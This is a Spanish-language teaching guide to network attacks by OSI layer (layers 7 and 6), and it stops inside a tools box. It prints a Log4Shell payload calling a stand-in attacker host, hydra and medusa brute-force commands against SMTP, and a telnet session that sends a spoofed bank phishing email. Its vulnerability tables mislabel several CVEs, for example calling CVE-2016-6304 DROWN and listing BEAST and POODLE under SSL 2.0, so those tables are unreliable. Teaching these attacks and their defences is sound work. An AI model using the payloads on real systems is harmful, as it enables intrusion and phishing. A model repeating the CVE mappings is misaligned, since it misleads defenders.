# Tipos de Ataques por Capa OSI

## Introducción

El modelo OSI (Open Systems Interconnection) proporciona un marco conceptual para entender cómo funcionan las comunicaciones de red. Cada capa presenta vulnerabilidades específicas que los atacantes pueden explotar. En este documento, analizaremos los ataques más comunes por capa y sus contramedidas correspondientes.

## Capa 7: Aplicación - Ataques de Red a Nivel de Aplicación

### ¿Qué es la Capa 7 y por qué es importante?

La **Capa 7 (Aplicación)** es donde los usuarios interactúan directamente con los servicios de red. Es como la "cara visible" de Internet que todos conocemos.

**¿Qué hace la Capa 7?**
- **Traduce** nombres fáciles de recordar (como "www.ejemplo.com") en direcciones IP numéricas
- **Proporciona** servicios como navegación web, correo electrónico, transferencia de archivos
- **Permite** que las aplicaciones se comuniquen entre sí usando protocolos estándar

**Analogía del Mundo Real:**
Imagina que la Capa 7 es como el **sistema de direcciones de una ciudad**:
- En lugar de decir "ve a la coordenada 33.4484° S, 70.6693° W"
- Decimos "ve a la Plaza Central de Ejemplo"
- DNS es como el **directorio telefónico** que traduce nombres en direcciones

### ¿Qué es DNS y por qué es crítico?

**DNS = Domain Name System (Sistema de Nombres de Dominio)**

**¿Qué hace DNS?**
```
┌─────────────────────────────────────────────────────────────┐
│                    FUNCIÓN DEL DNS                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  USUARIO: "Quiero ir a www.nancoejemplo.cl"                  │
│                                                             │
│  DNS SERVER: "Esa dirección está en 200.1.2.3"             │
│                                                             │
│  RESULTADO: Navegador va a 200.1.2.3                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**¿Por qué es crítico?**
- **Sin DNS**, tendríamos que memorizar direcciones IP como "142.250.190.78" para ir a Google
- **DNS es la base** de toda navegación web moderna
- **Si DNS falla**, Internet se vuelve prácticamente inusable

**¿Por qué está en Capa 7?**
DNS es un **servicio de aplicación** que:
- Responde a **solicitudes de usuarios** (nombres de dominio)
- Proporciona **información de red** (direcciones IP)
- Funciona **independientemente** de cómo se transmitan los datos

### Diagrama de Ataque: DNS Poisoning

```
┌─────────────────────────────────────────────────────────────┐
│                    CAPA 7: APLICACIÓN                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  CLIENTE                    DNS SERVER        SERVIDOR MALICIOSO │
│     │                          │                    │      │
│     │ 1. Solicita              │                    │      │
│     │    www.nancoejemplo.com         │                    │      │
│     │                          │                    │      │
│     │ 2. DNS Server            │                    │      │
│     │    responde con          │                    │      │
│     │    IP falsa              │                    │      │
│     │                          │                    │      │
│     │ 3. Cliente se            │                    │      │
│     │    conecta a             │                    │      │
│     │    servidor falso        │                    │      │
│     │                          │                    │      │
│     │ 4. Robo de               │                    │      │
│     │    credenciales          │                    │      │
│     │                          │                    │      │
└─────────────────────────────────────────────────────────────┘
```

**Ataques Principales de Red:**

**1. DNS Poisoning (Envenenamiento DNS):**
- **¿Qué es?** Corromper la caché DNS para redirigir usuarios a sitios falsos
- **¿Cómo funciona?** El atacante hace que el DNS responda con IPs falsas
- **¿Cómo lo logra el atacante?**
  - **Método 1:** Comprometer físicamente el servidor DNS
  - **Método 2:** Usar ARP Poisoning para interceptar consultas DNS
  - **Método 3:** Explotar vulnerabilidades en software DNS
  - **Método 4:** Usar herramientas como `dnsmasq` para crear DNS falso
- **Ejemplo:** Usuario quiere ir a "www.nancoejemplo.com" pero va a un sitio falso
- **Impacto:** Robo de credenciales bancarias, datos personales

**2. HTTP/HTTPS Interception (Interceptación Web):**
- **¿Qué es?** Capturar y modificar el tráfico web entre usuario y servidor
- **¿Cómo funciona?** El atacante se posiciona entre el usuario y el sitio web
- **¿Cómo lo logra el atacante?**
  - **Método 1:** ARP Poisoning para interceptar tráfico local
  - **Método 2:** Comprometer router o switch de la red
  - **Método 3:** Crear punto de acceso WiFi falso (Evil Twin)
  - **Método 4:** Usar herramientas como `mitmproxy` o `Burp Suite`
- **Ejemplo:** Interceptar contraseñas, números de tarjeta de crédito
- **Impacto:** Robo de información sensible, suplantación de identidad

**3. Email Spoofing (Falsificación de Email):**
- **¿Qué es?** Enviar emails que parecen venir de otra persona o empresa
- **¿Cómo funciona?** Modificar los encabezados del email para cambiar el remitente
- **¿Cómo lo logra el atacante?**
  - **Método 1:** Usar herramientas como `swaks` o `sendmail` con headers falsos
  - **Método 2:** Comprometer servidor SMTP para enviar emails falsos
    ```
    ┌─────────────────────────────────────────────────────────────┐
    │                COMPROMISO DE SERVIDOR SMTP                 │
    ├─────────────────────────────────────────────────────────────┤
    │                                                             │
    │  PASOS DEL ATAQUE:                                         │
    │                                                             │
    │  1. RECONOCIMIENTO:                                        │
    │     • Escanear puerto 25 (SMTP) en servidores objetivo     │
    │     • Identificar versión de software SMTP (Postfix,      │
    │       Exchange, Sendmail)                                  │
    │     • Buscar configuraciones débiles (open relay)          │
    │                                                             │
    │  ¿QUÉ ES OPEN RELAY?                                       │
    │                                                             │
    │  Un servidor SMTP "open relay" es como una oficina de      │
    │  correos que acepta paquetes de CUALQUIERA y los envía      │
    │  a CUALQUIER DESTINO sin verificar identidad.              │
    │                                                             │
    │  NORMAL (SEGURO):                                          │
    │  ┌─────────────────────────────────────────────────────┐   │
    │  │  CLIENTE: "Soy usuario@empresa.com"               │   │
    │  │  SMTP: "OK, puedes enviar emails de tu dominio"    │   │
    │  │  RESULTADO: Solo emails autorizados se envían      │   │
    │  └─────────────────────────────────────────────────────┘   │
    │                                                             │
    │  OPEN RELAY (PELIGROSO):                                   │
    │  ┌─────────────────────────────────────────────────────┐   │
    │  │  ATACANTE: "Enviar email de cualquiera@cualquier.com" │   │
    │  │  SMTP: "OK, no me importa quién eres"               │   │
    │  │  RESULTADO: Cualquier email se envía sin control     │   │
    │  └─────────────────────────────────────────────────────┘   │
    │                                                             │
    │  ¿POR QUÉ ES PELIGROSO?                                    │
    │  • Permite enviar emails falsos masivamente              │
    │  • Se usa para spam y phishing a gran escala              │
    │  • Oculta el origen real del atacante                     │
    │  • Puede hacer que el servidor sea bloqueado por ISPs     │
    │                                                             │
    │  EJEMPLO PRÁCTICO:                                         │
    │  $ telnet servidor.com 25                                  │
    │  > EHLO atacante.com                                       │
    │  > MAIL FROM: banco@falso.com                             │
    │  > RCPT TO: victima@email.com                             │
    │  > DATA                                                     │
    │  > Subject: Tu cuenta bancaria está bloqueada             │
    │  > Hola, necesitamos que verifiques tus datos...          │
    │  > .                                                        │
    │  > QUIT                                                     │
    │                                                             │
    │  RESULTADO: Email falso enviado exitosamente              │
    │                                                             │
    │  ¿CÓMO DETECTAR OPEN RELAY?                                │
    │                                                             │
    │  MÉTODO 1 - TELNET MANUAL:                                 │
    │  $ telnet servidor.com 25                                  │
    │  > EHLO test.com                                           │
    │  > MAIL FROM: test@cualquier.com                          │
    │  > RCPT TO: test@otro.com                                  │
    │  > DATA                                                     │
    │  > Test                                                     │
    │  > .                                                        │
    │  > QUIT                                                     │
    │                                                             │
    │  SI RESPONDE "250 OK" = OPEN RELAY                        │
    │  SI RESPONDE "550 Rejected" = SEGURO                       │
    │                                                             │
    │  MÉTODO 2 - HERRAMIENTAS AUTOMÁTICAS:                      │
    │  $ nmap --script smtp-open-relay servidor.com             │
    │  $ swaks --to test@otro.com --from test@cualquier.com     │
    │  $ python3 -c "import smtplib; s=smtplib.SMTP('servidor.com')" │
    │                                                             │
    │  MÉTODO 3 - VERIFICACIÓN ONLINE:                           │
    │  • Usar servicios como mxtoolbox.com                      │
    │  • Verificar en listas negras de open relays              │
    │  • Revisar logs del servidor SMTP                          │
    │                                                             │
    │  ¿CÓMO PREVENIR OPEN RELAY?                                 │
    │                                                             │
    │  CONFIGURACIÓN POSTFIX (LINUX):                             │
    │  # /etc/postfix/main.cf                                     │
    │  smtpd_relay_restrictions =                                │
    │      permit_mynetworks,                                     │
    │      permit_sasl_authenticated,                             │
    │      reject_unauth_destination                              │
    │                                                             │
    │  CONFIGURACIÓN EXCHANGE (WINDOWS):                          │
    │  • Habilitar autenticación SMTP                             │
    │  • Configurar filtros de IP permitidas                      │
    │  • Usar TLS/SSL para conexiones                             │
    │                                                             │
    │  CONFIGURACIÓN SENDMAIL:                                    │
    │  # /etc/mail/sendmail.cf                                   │
    │  DAEMON_OPTIONS(`Port=smtp,Addr=127.0.0.1, Name=MTA')      │
    │  FEATURE(`access_db')dnl                                    │
    │                                                             │
    │  VERIFICACIÓN DE SEGURIDAD:                                │
    │  • Probar envío de emails no autorizados                    │
    │  • Monitorear logs de SMTP regularmente                     │
    │  • Usar herramientas de escaneo de vulnerabilidades        │
    │  • Mantener software actualizado                            │
    │                                                             │
    │                                                             │
    │  2. EXPLOTACIÓN:                                           │
    │     • Ataques de fuerza bruta contra credenciales SMTP     │
    │     • Explotar vulnerabilidades conocidas en software SMTP    │
    │       (Postfix, Exchange, Sendmail)                         │
    │     • Comprometer aplicaciones web que usan SMTP            │
    │       (CVE-2021-44228 en Log4j afecta aplicaciones web)     │
    │     • Usar configuraciones open relay mal configuradas    │
    │     • Comprometer servidor web que usa SMTP               │
    │                                                             │
    │  VULNERABILIDADES ESPECÍFICAS DE SMTP:                     │
    │  • CVE-2011-1720: Buffer overflow en Sendmail              │
    │  • CVE-2011-0411: Denial of service en Postfix             │
    │  • CVE-2010-4344: Privilege escalation en Exchange          │
    │  • Configuraciones open relay mal configuradas            │
    │  • Autenticación débil o ausente                           │
    │                                                             │
    │  VULNERABILIDADES DE APLICACIONES WEB CON SMTP:             │
    │  • CVE-2021-44228 (Log4Shell): Afecta aplicaciones Java    │
    │    que usan Log4j para logging, incluyendo apps web        │
    │  • CVE-2021-45046: Log4j2 DoS vulnerability                │
    │  • SQL Injection en formularios de contacto                │
    │  • XSS en páginas de configuración de email                 │
    │                                                             │
    │  EJEMPLO: LOG4SHELL EN APLICACIÓN WEB CON SMTP              │
    │                                                             │
    │  ESCENARIO: Aplicación web que envía emails de contacto     │
    │  usando Log4j para logging y SMTP para envío.              │
    │                                                             │
    │  ATAQUE:                                                     │
    │  1. Atacante envía payload Log4Shell en formulario:        │
    │     ${jndi:ldap://atacante.com:1389/Exploit}               │
    │                                                             │
    │  2. Aplicación web registra el input en Log4j               │
    │                                                             │
    │  3. Log4j ejecuta el payload y descarga código malicioso    │
    │                                                             │
    │  4. Atacante obtiene acceso al servidor web                 │
    │                                                             │
    │  5. Desde el servidor web, puede acceder a configuración    │
    │     SMTP y enviar emails falsos                            │
    │                                                             │
    │  RESULTADO: Compromiso de aplicación web →                  │
    │             Acceso a SMTP → Email spoofing                 │
    │                                                             │
    │                                                             │
    │  3. ACCESO:                                                │
    │     • Obtener acceso root/admin al servidor SMTP           │
    │     • Modificar configuraciones de autenticación          │
    │     • Instalar backdoors para acceso persistente           │
    │                                                             │
    │  4. ABUSO:                                                 │
    │     • Enviar emails masivos con remitentes falsos          │
    │     • Usar servidor comprometido como relay para spam     │
    │     • Ocultar origen real de ataques de phishing          │
    │                                                             │
    └─────────────────────────────────────────────────────────────┘
    ```
  - **Método 3:** Usar scripts de Python con librerías de email
  - **Método 4:** Explotar configuraciones débiles en servidores de correo
- **Ejemplo:** Email que parece venir del banco pidiendo datos
- **Impacto:** Phishing, robo de credenciales, distribución de malware

**Herramientas de Ataque SMTP:**

```
┌─────────────────────────────────────────────────────────────┐
│                HERRAMIENTAS DE ATAQUE SMTP                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ⚠️  DISCLAMER IMPORTANTE: ⚠️                              │
│  Las siguientes herramientas y técnicas se estudiarán      │
│  ÚNICAMENTE en ambientes controlados de laboratorio        │
│  para fines educativos y de seguridad defensiva.           │
│  Su uso en sistemas sin autorización es ILEGAL.            │
│                                                             │
│  RECONOCIMIENTO:                                            │
│  • nmap -p 25,587,465 servidor.com (Escaneo de puertos)   │
│  • telnet servidor.com 25 (Conexión manual SMTP)          │
│  • nslookup -type=mx dominio.com (Consulta registros MX)   │
│  • dig MX dominio.com (Herramienta DNS avanzada)          │
│  • smtp-user-enum (Enumeración de usuarios SMTP)           │
│                                                             │
│  FUERZA BRUTA:                                             │
│  • hydra -l usuario -P wordlist.txt smtp servidor.com      │
│    (Herramienta de fuerza bruta multiprotocolo)           │
│  • medusa -h servidor.com -u usuario -P wordlist.txt -M smtp │
│    (Scanner de autenticación paralelo)                     │
│  • patator smtp_login host=servidor.com user=usuario       │
│    (Framework modular de fuerza bruta)                     │
│  • thc-hydra (Versión especializada de Hydra)             │
│                                                             │
│  ENVÍO DE EMAILS FALSOS:                                   │
│  • swaks --to victima@email.com --from banco@falso.com     │
│    (Swiss Army Knife for SMTP - herramienta de testing)   │
│  • sendmail -t < email_falso.txt (Cliente SMTP nativo)    │
│  • python smtplib para scripts automatizados              │
│    (Librería Python para automatización)                   │
│  • sendemail (Cliente ligero de línea de comandos)        │
│                                                             │
│  EXPLOTACIÓN:                                              │
│  • Metasploit: use auxiliary/scanner/smtp/smtp_version    │
│    (Framework de penetration testing)                      │
│  • NSE scripts: nmap --script smtp-* servidor.com         │
│    (Nmap Scripting Engine para SMTP)                      │
│  • Custom exploits para vulnerabilidades específicas       │
│    (Exploits desarrollados para CVEs conocidas)            │
│  • smtp-relay-scanner (Detector de Open Relay)            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**4. FTP/SFTP Attacks (Ataques a Transferencia de Archivos):**
- **¿Qué es?** Comprometer protocolos de transferencia de archivos
- **¿Cómo funciona?** Explotar vulnerabilidades en FTP (sin encriptar) o SFTP
- **¿Cómo lo logra el atacante?**
  - **Método 1:** Ataques de fuerza bruta contra credenciales FTP
  - **Método 2:** Explotar vulnerabilidades como buffer overflow en servidores FTP
  - **Método 3:** Usar herramientas como `hydra` para ataques de diccionario
  - **Método 4:** Interceptar tráfico FTP no encriptado con `wireshark`
- **Ejemplo:** Robar archivos confidenciales, subir malware
- **Impacto:** Pérdida de datos sensibles, infección de sistemas

**5. SSH Attacks (Ataques a Acceso Remoto):**
- **¿Qué es?** Intentar acceder a sistemas remotos sin autorización
- **¿Cómo funciona?** Ataques de fuerza bruta, explotar configuraciones débiles
- **¿Cómo lo logra el atacante?**
  - **Método 1:** Ataques de fuerza bruta con herramientas como `hydra` o `medusa`
  - **Método 2:** Usar diccionarios de contraseñas comunes
  - **Método 3:** Explotar configuraciones SSH débiles (permitir root login)
  - **Método 4:** Usar vulnerabilidades conocidas en versiones antiguas de SSH
- **Ejemplo:** Intentar adivinar contraseñas de servidores
- **Impacto:** Acceso no autorizado a sistemas críticos

**Contramedidas de Red:**

**1. DNSSEC (DNS Security Extensions):**
- **¿Qué es?** Sistema de seguridad que agrega firmas digitales a DNS
- **¿Cómo funciona?** Verifica que las respuestas DNS sean auténticas
- **Ejemplo:** Previene que DNS responda con IPs falsas
- **Beneficio:** Protege contra DNS Poisoning

**2. WAF (Web Application Firewall):**
- **¿Qué es?** Firewall especializado en proteger aplicaciones web
- **¿Cómo funciona?** Analiza el tráfico HTTP/HTTPS y bloquea ataques
- **Ejemplo:** Bloquea intentos de SQL Injection, XSS (l)
- **Beneficio:** Protege sitios web de ataques de aplicación

**3. Email Filtering y SPF/DKIM:**
- **¿Qué es?** Filtros de correo y autenticación de emails
- **¿Cómo funciona?** SPF verifica que el email venga del servidor correcto, DKIM verifica la integridad
- **Ejemplo:** Bloquea emails falsos que pretenden ser del banco
- **Beneficio:** Reduce phishing y spam

**4. Protocol Inspection en Firewalls:**
- **¿Qué es?** Análisis profundo del contenido de los paquetes de red
- **¿Cómo funciona?** Examina el contenido de FTP, SSH, HTTP para detectar ataques
- **Ejemplo:** Detecta intentos de acceso SSH no autorizado
- **Beneficio:** Detección temprana de ataques

**5. Monitoreo de Servicios SSH:**
- **¿Qué es?** Vigilancia continua de intentos de acceso SSH
- **¿Cómo funciona?** Registra y alerta sobre intentos de login fallidos
- **Ejemplo:** Alerta cuando alguien intenta 100 contraseñas en 1 minuto
- **Beneficio:** Detección de ataques de fuerza bruta

**Detección y Respuesta a Ataques de Capa 7:**

**¿Cómo detectar estos ataques?**
```
┌─────────────────────────────────────────────────────────────┐
│                    DETECCIÓN DE ATAQUES                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  DNS POISONING:                                             │
│  • Monitorear cambios súbitos en respuestas DNS            │
│  • Alertas cuando IPs de dominios críticos cambian          │
│  • Análisis de tráfico DNS anómalo                         │
│                                                             │
│  HTTP INTERCEPTION:                                         │
│  • Detectar certificados SSL/TLS no válidos                │
│  • Alertas de conexiones HTTP en lugar de HTTPS             │
│  • Monitoreo de patrones de tráfico web inusuales          │
│                                                             │
│  EMAIL SPOOFING:                                            │
│  • Verificar headers de email (SPF, DKIM, DMARC)           │
│  • Alertas de emails que fallan autenticación               │
│  • Análisis de patrones de phishing conocidos              │
│                                                             │
│  FTP/SSH ATTACKS:                                           │
│  • Logs de intentos de login fallidos                      │
│  • Alertas de múltiples intentos desde la misma IP          │
│  • Monitoreo de conexiones desde IPs no autorizadas        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**¿Cómo responder cuando ocurren?**
```
┌─────────────────────────────────────────────────────────────┐
│                    RESPUESTA A INCIDENTES                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PASO 1: CONTENCIÓN                                         │
│  • Bloquear IPs atacantes en firewalls                     │
│  • Cambiar credenciales comprometidas                      │
│  • Aislar sistemas afectados                               │
│                                                             │
│  PASO 2: INVESTIGACIÓN                                      │
│  • Analizar logs de seguridad                              │
│  • Identificar alcance del compromiso                      │
│  • Documentar evidencia del ataque                         │
│                                                             │
│  PASO 3: ERADICACIÓN                                         │
│  • Eliminar malware o herramientas del atacante           │
│  • Parchear vulnerabilidades explotadas                    │
│  • Restaurar configuraciones seguras                       │
│                                                             │
│  PASO 4: RECUPERACIÓN                                        │
│  • Restaurar servicios afectados                           │
│  • Verificar que no hay backdoors                          │
│  • Monitorear por actividad recurrente                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## Capa 6: Presentación - Ataques de Codificación

### ¿Qué es la Capa 6 y por qué es importante?

La **Capa 6 (Presentación)** se encarga de **convertir y proteger** los datos para que puedan ser transmitidos de forma segura por la red.

**¿Qué hace la Capa 6?**
- **Encripta** datos sensibles antes de enviarlos
- **Convierte** formatos de datos entre diferentes sistemas
- **Comprime** datos para optimizar el tráfico de red
- **Valida** que los datos lleguen sin corromperse

**Analogía del Mundo Real:**
Imagina que la Capa 6 es como un **traductor diplomático**:
- **Convierte** mensajes de un idioma a otro
- **Encripta** información confidencial
- **Asegura** que el mensaje llegue intacto al destinatario

### ¿Qué es SSL/TLS y por qué es crítico?

**SSL/TLS = Secure Sockets Layer / Transport Layer Security**

**¿Qué hace SSL/TLS?**
```
┌─────────────────────────────────────────────────────────────┐
│                    FUNCIÓN DE SSL/TLS                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  DATOS ORIGINALES: "Mi contraseña es 123456"               │
│                                                             │
│  SSL/TLS ENCRIPTA: "x8f2k9m3n7p1q4r6s9t2u5v8w1x4y7z0"     │
│                                                             │
│  RESULTADO: Datos seguros en tránsito                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**¿Por qué es crítico?**
- **Sin SSL/TLS**, todos los datos viajan "en texto plano" (sin encriptar)
- **SSL/TLS protege** información sensible como contraseñas, datos bancarios
- **El candado verde** en el navegador indica que SSL/TLS está activo

**¿Por qué está en Capa 6?**
SSL/TLS es un **protocolo de presentación** que:
- **Encripta** datos antes de enviarlos por la red
- **Proporciona** autenticación entre cliente y servidor
- **Garantiza** la integridad de los datos transmitidos

### Diagrama de Ataque: Man-in-the-Middle SSL/TLS

```
┌─────────────────────────────────────────────────────────────┐
│                  CAPA 6: PRESENTACIÓN                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  CLIENTE           ATACANTE           SERVIDOR             │
│     │                 │                  │                 │
│     │ 1. Solicita     │                  │                 │
│     │    conexión     │                  │                 │
│     │    HTTPS        │                  │                 │
│     │                 │                  │                 │
│     │ 2. Intercepta   │                  │                 │
│     │    handshake    │                  │                 │
│     │                 │                  │                 │
│     │ 3. Falsifica    │                  │                 │
│     │    certificado  │                  │                 │
│     │                 │                  │                 │
│     │ 4. Descifra     │                  │                 │
│     │    tráfico      │                  │                 │
│     │                 │                  │                 │
│     │ 5. Reenvía      │                  │                 │
│     │    datos        │                  │                 │
│     │                 │                  │                 │
└─────────────────────────────────────────────────────────────┘
```

**Ataques Principales:**

**1. Format String Attacks (Ataques de Formato):**
- **¿Qué es?** Explotar funciones que formatean texto para ejecutar código malicioso
- **¿Cómo funciona?** El atacante inyecta caracteres de formato especiales
- **Ejemplo:** `printf("%s%s%s%s%s%s%s%s")` puede causar desbordamiento de buffer
- **Impacto:** Ejecución de código malicioso, corrupción de memoria

**2. Encoding Attacks (Ataques de Codificación):**
- **¿Qué es?** Usar caracteres especiales codificados para evadir filtros de seguridad
- **¿Cómo funciona?** Codificar caracteres maliciosos de formas no esperadas
- **Ejemplo:** Usar `%3C` en lugar de `<` para evadir filtros XSS
- **Impacto:** Bypass de filtros de seguridad, inyección de código

**3. SSL/TLS Downgrade (Degradación de Seguridad):**
- **¿Qué es?** Forzar el uso de versiones menos seguras de SSL/TLS
- **¿Cómo funciona?** El atacante interrumpe la negociación de protocolos seguros
- **Ejemplo:** Forzar HTTPS a usar SSL 2.0 (muy vulnerable)
- **Impacto:** Comunicaciones menos seguras, interceptación de datos

**VERSIONES DE SSL/TLS - SEGURIDAD:**

```
┌─────────────────────────────────────────────────────────────┐
│                VERSIONES SSL/TLS - ESTADO                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ❌ SSL 2.0 (1995) - MUY VULNERABLE                        │
│  • Vulnerabilidades críticas conocidas                     │
│  • Nunca usar en producción                                │
│  • Obsoleto y deshabilitado por defecto                    │
│                                                             │
│  ❌ SSL 3.0 (1996) - VULNERABLE                            │
│  • Vulnerable a POODLE attack                              │
│  • No usar en sistemas modernos                            │
│  • Deshabilitado en navegadores actuales                   │
│                                                             │
│  ⚠️ TLS 1.0 (1999) - DEPRECADO                            │
│  • Vulnerable a BEAST attack                               │
│  • Solo usar si es absolutamente necesario                 │
│  • En proceso de eliminación                                │
│                                                             │
│  ⚠️ TLS 1.1 (2006) - DEPRECADO                            │
│  • Mejoras sobre TLS 1.0 pero aún vulnerable               │
│  • No recomendado para uso moderno                         │
│  • En proceso de eliminación                                │
│                                                             │
│  ✅ TLS 1.2 (2008) - SEGURO                                │
│  • Ampliamente soportado y seguro                          │
│  • Usar con cifrados fuertes (AES, ChaCha20)              │
│  • Recomendado para compatibilidad                         │
│                                                             │
│  ✅ TLS 1.3 (2018) - MÁS SEGURO                            │
│  • Última versión con mejoras de seguridad                │
│  • Elimina protocolos débiles por defecto                  │
│  • RECOMENDADO para nuevos sistemas                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**CONFIGURACIÓN SEGURA RECOMENDADA:**

```
┌─────────────────────────────────────────────────────────────┐
│                CONFIGURACIÓN TLS SEGURA                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SERVIDORES WEB (Apache/Nginx):                             │
│  • Habilitar solo TLS 1.2 y TLS 1.3                        │
│  • Deshabilitar SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1         │
│  • Usar cifrados fuertes: AES-256, ChaCha20                │
│  • Configurar HSTS (HTTP Strict Transport Security)        │
│                                                             │
│  APLICACIONES CLIENTE:                                      │
│  • Configurar para usar TLS 1.2+ por defecto               │
│  • Implementar fallback seguro                             │
│  • Validar certificados digitales                          │
│  • Usar Certificate Pinning cuando sea posible            │
│                                                             │
│  VERIFICACIÓN:                                              │
│  • Usar herramientas como SSL Labs, TestSSL.sh             │
│  • Monitorear logs de conexiones TLS                       │
│  • Alertas de intentos de downgrade                        │
│    • Auditorías regulares de configuración                   │
  │                                                             │
└─────────────────────────────────────────────────────────────┘
```

**VULNERABILIDADES ESPECÍFICAS POR VERSIÓN:**

```
┌─────────────────────────────────────────────────────────────┐
│              VULNERABILIDADES SSL/TLS POR VERSIÓN            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SSL 2.0 - VULNERABILIDADES CRÍTICAS:                      │
│  • CVE-2011-3389 (BEAST): Interceptación de datos         │
│  • CVE-2014-3566 (POODLE): Descifrado de datos             │
│  • CVE-2014-8730 (FREAK): Factorización de claves débiles  │
│  • Sin soporte para cifrados modernos                      │
│                                                             │
│  SSL 3.0 - VULNERABILIDADES CONOCIDAS:                     │
│  • CVE-2014-3566 (POODLE): Padding Oracle attack           │
│  • CVE-2014-8730 (FREAK): Factorización RSA-512           │
│  • CVE-2015-0204 (FREAK): Factorización de claves débiles  │
│  • Vulnerable a ataques de tiempo                          │
│                                                             │
│  TLS 1.0 - VULNERABILIDADES MODERNAS:                       │
│  • CVE-2011-3389 (BEAST): Browser Exploit Against SSL/TLS │
│  • CVE-2016-2183 (SWEET32): Birthday attack en 3DES        │
│  • CVE-2016-6304 (DROWN): Cross-protocol attack            │
│  • Cifrados débiles por defecto                            │
│                                                             │
│  TLS 1.1 - VULNERABILIDADES MENORES:                        │
│  • CVE-2016-2183 (SWEET32): Birthday attack en 3DES        │
│  • CVE-2016-6304 (DROWN): Cross-protocol attack            │
│  • Algunos cifrados débiles aún soportados                 │
│  • Mejor que TLS 1.0 pero no óptimo                        │
│                                                             │
│  TLS 1.2 - SEGURO CON CONFIGURACIÓN ADECUADA:               │
│  • Vulnerable solo si se usan cifrados débiles              │
│  • CVE-2016-2183 (SWEET32): Solo con 3DES                  │
│  • CVE-2016-6304 (DROWN): Solo con configuración incorrecta │
│  • Ampliamente soportado y seguro                           │
│                                                             │
│  TLS 1.3 - MÁXIMA SEGURIDAD:                                │
│  • Elimina todos los cifrados débiles por defecto          │
│  • Perfect Forward Secrecy (PFS) obligatorio               │
│  • Handshake más rápido y seguro                           │
│  • Sin vulnerabilidades conocidas críticas                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**4. Certificate Pinning Bypass (Evadir Verificación de Certificados):**
- **¿Qué es?** Evadir la verificación estricta de certificados digitales
- **¿Cómo funciona?** Modificar la aplicación para aceptar certificados falsos
- **Ejemplo:** Cambiar la configuración de una app para aceptar certificados no válidos
- **Impacto:** Suplantación de identidad, interceptación de comunicaciones

**Contramedidas:**

**1. Validación de Certificados Digitales:**
- **¿Qué es?** Verificar que los certificados SSL/TLS sean auténticos
- **¿Cómo funciona?** Comprobar que el certificado viene de una autoridad confiable
- **Ejemplo:** Verificar que el certificado de "www.nancoejemplo.com" sea real
- **Beneficio:** Previene suplantación de sitios web

**¿CÓMO SE VALIDA UN CERTIFICADO DIGITAL?**

```
┌─────────────────────────────────────────────────────────────┐
│                PROCESO DE VALIDACIÓN SSL/TLS                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PASO 1: CONEXIÓN HTTPS                                    │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  CLIENTE: "Quiero conectarme a www.nancoejemplo.com"      │   │
│  │  SERVIDOR: "Aquí está mi certificado digital"      │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  PASO 2: VERIFICACIÓN DE LA CADENA DE CONFIANZA            │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  CERTIFICADO SITIO WEB                               │   │
│  │  ↓ (firmado por)                                     │   │
│  │  CERTIFICADO INTERMEDIO                              │   │
│  │  ↓ (firmado por)                                     │   │
│  │  CERTIFICADO RAÍZ (CA)                               │   │
│  │  ↓ (confiable)                                       │   │
│  │  ALMACÉN DE CERTIFICADOS RAÍZ                        │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  PASO 3: VERIFICACIONES ESPECÍFICAS                       │
│  • Nombre del dominio coincide                            │
│  • Certificado no ha expirado                             │
│  • Certificado no ha sido revocado                        │
│  • Firma digital es válida                                │
│  • Autoridad certificadora es confiable                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**VERIFICACIONES TÉCNICAS DETALLADAS:**

```
┌─────────────────────────────────────────────────────────────┐
│              VERIFICACIONES TÉCNICAS SSL/TLS                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. VERIFICACIÓN DE DOMINIO:                               │
│  • Subject Alternative Name (SAN) debe incluir el dominio │
│  • Wildcard certificates: *.nancoejemplo.com cubre subdominios   │
│  • Multi-domain certificates: múltiples dominios           │
│  • Ejemplo: Certificado para "www.nancoejemplo.com" debe          │
│    incluir exactamente ese nombre                          │
│                                                             │
│  2. VERIFICACIÓN DE FECHA:                                 │
│  • Certificado no debe haber expirado                      │
│  • Fecha actual debe estar entre "Not Before" y "Not After" │
│  • Alertas cuando faltan <30 días para expirar             │
│  • Ejemplo: Certificado válido hasta 2025-12-31           │
│                                                             │
│  3. VERIFICACIÓN DE REVOCACIÓN:                            │
│  • OCSP (Online Certificate Status Protocol)              │
│  • CRL (Certificate Revocation List)                       │
│  • Verificar que el certificado no esté en lista negra     │
│  • Ejemplo: Consultar OCSP responder de la CA              │
│                                                             │
│  4. VERIFICACIÓN DE FIRMA:                                 │
│  • Algoritmo de firma (RSA, ECDSA, EdDSA)                 │
│  • Tamaño de clave (2048 bits mínimo para RSA)             │
│  • Verificar que la firma sea criptográficamente válida    │
│  • Ejemplo: RSA-2048 con SHA-256                           │
│                                                             │
│  5. VERIFICACIÓN DE AUTORIDAD:                             │
│  • CA debe estar en almacén de certificados raíz           │
│  • Verificar políticas de la CA                            │
│  • Comprobar nivel de validación (DV, OV, EV)             │
│  • Ejemplo: Let's Encrypt, CertAuth Ejemplo, GlobalCert           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**HERRAMIENTAS DE VALIDACIÓN:**

```
┌─────────────────────────────────────────────────────────────┐
│                HERRAMIENTAS DE VALIDACIÓN                   │
